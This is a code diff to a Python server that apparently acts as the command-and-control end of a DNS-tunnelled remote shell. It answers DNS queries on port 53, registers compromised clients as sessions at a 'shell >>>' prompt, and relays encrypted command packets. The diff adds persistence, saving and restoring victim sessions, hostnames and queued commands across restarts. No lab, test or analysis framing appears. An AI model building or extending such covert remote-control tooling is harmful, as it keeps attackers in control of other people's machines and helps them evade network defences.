@@ -3,6 +3,7 @@ import sys
 import os
 import time
 import threading
+import signal
 from collections import defaultdict
 from datetime import datetime
 import binascii
@@ -16,6 +17,7 @@ from lib.crypto.symetric import open_sealed
 from lib.protocol import comm_pb2
 from lib.logging import printf, println
 from cmd.server import cli
+from lib.persistence.session_store import SessionStore, SessionRecovery
 
 # Try to import embedded config first
 try:
@@ -53,6 +55,10 @@ cli.console_buffer = {}
 cli.packet_queue = {}
 cli.sessions_map = {}
 
+# Initialize session store
+session_store = SessionStore()
+
+
 class ClientInfo:
     """Store client session information."""
     
@@ -62,6 +68,7 @@ class ClientInfo:
         self.lock = threading.Lock()
         self.conn = {}  # {chunk_id: ConnData}
 
+
 class ConnData:
     """Store connection chunk data."""
     
@@ -70,6 +77,7 @@ class ConnData:
         self.nonce = None
         self.packets = {}  # {chunk_num: data}
 
+
 class PollTemporaryData:
     """Temporary storage for poll queries."""
     
@@ -77,8 +85,10 @@ class PollTemporaryData:
         self.lastseen = time.time()
         self.data = data
 
+
 # Global caches
 poll_cache = {}
+
 
 class ShellResolver(BaseResolver):
     """DNS resolver for Shell protocol."""
@@ -141,9 +151,7 @@ class ShellResolver(BaseResolver):
 
             # Check if session exists, create if new
             if client_guid not in cli.sessions_map:
-                # <<< FORCE PRINT FULL ID WHEN A NEW CLIENT APPEARS >>>
                 print(f"\r\nNew session : {client_guid}\nshell >>> ", end='', flush=True)
-
                 cli.sessions_map[client_guid] = ClientInfo()
                 cli.console_buffer[client_guid] = []
             
@@ -246,6 +254,7 @@ class ShellResolver(BaseResolver):
             # Clean up connection
             del session.conn[chunk_id]
 
+
 def timeout_checker():
     """Check for timed-out sessions."""
     while True:
@@ -267,6 +276,7 @@ def timeout_checker():
             if client_guid in cli.console_buffer:
                 del cli.console_buffer[client_guid]
 
+
 def poll_cache_cleaner():
     """Clean old poll cache entries."""
     while True:
@@ -283,6 +293,63 @@ def poll_cache_cleaner():
         for poll_data in cache_to_remove:
             del poll_cache[poll_data]
 
+
+def load_previous_sessions():
+    """Load sessions from previous server run."""
+    print("[*] Checking for previous sessions...")
+    
+    sessions_data, console_buffer, packet_queue = session_store.load_sessions()
+    
+    if not sessions_data:
+        print("[*] No previous sessions found")
+        return
+    
+    # Cleanup stale sessions (older than 1 hour)
+    sessions_data = SessionRecovery.cleanup_stale_sessions(sessions_data, max_age=3600)
+    
+    if not sessions_data:
+        print("[*] No valid sessions to restore")
+        return
+    
+    # Restore sessions
+    restored_count = 0
+    for client_guid, data in sessions_data.items():
+        session = SessionRecovery.restore_session(client_guid, data, ClientInfo)
+        cli.sessions_map[client_guid] = session
+        restored_count += 1
+        
+        print(f"[+] Restored session: {client_guid[:16]}... ({data['hostname']})")
+    
+    # Restore buffers and queues
+    cli.console_buffer.update(console_buffer)
+    cli.packet_queue.update(packet_queue)
+    
+    print(f"[+] Restored {restored_count} sessions from previous run\n")
+
+
+def save_all_sessions():
+    """Save all current sessions to disk."""
+    success, msg = session_store.save_sessions(
+        cli.sessions_map,
+        cli.console_buffer,
+        cli.packet_queue
+    )
+    print(f"[*] {msg}")
+    return success, msg
+
+
+def get_current_sessions():
+    """Get current sessions for auto-save."""
+    return cli.sessions_map, cli.console_buffer, cli.packet_queue
+
+
+def signal_handler(sig, frame):
+    """Handle graceful shutdown."""
+    print("\n[*] Shutting down gracefully...")
+    save_all_sessions()
+    sys.exit(0)
+
+
 def main():
     """Main server function."""
     
@@ -294,10 +361,18 @@ def main():
     print(f"Target Domain: {TARGET_DOMAIN}")
     print(f"Listening on UDP port 53\n")
     
+    # Load previous sessions
+    load_previous_sessions()
+    
+    # Start auto-save thread (every 30 seconds)
+    print("[*] Starting auto-save (every 30 seconds)")
+    
+    session_store.auto_save_loop(get_current_sessions, interval=30)
+    
     # Start DNS server in background thread
     resolver = ShellResolver()
     error_logger = DNSLogger(log="error", prefix=False)
-
+    
     dns_server = DNSServer(resolver, port=53, address="0.0.0.0", logger=error_logger)
     
     dns_thread = threading.Thread(target=dns_server.start, daemon=True)
@@ -311,8 +386,13 @@ def main():
     cache_thread = threading.Thread(target=poll_cache_cleaner, daemon=True)
     cache_thread.start()
     
+    # Register signal handlers for graceful shutdown
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
     # Run CLI
     cli.run_cli()
+
 
 if __name__ == "__main__":
     main()
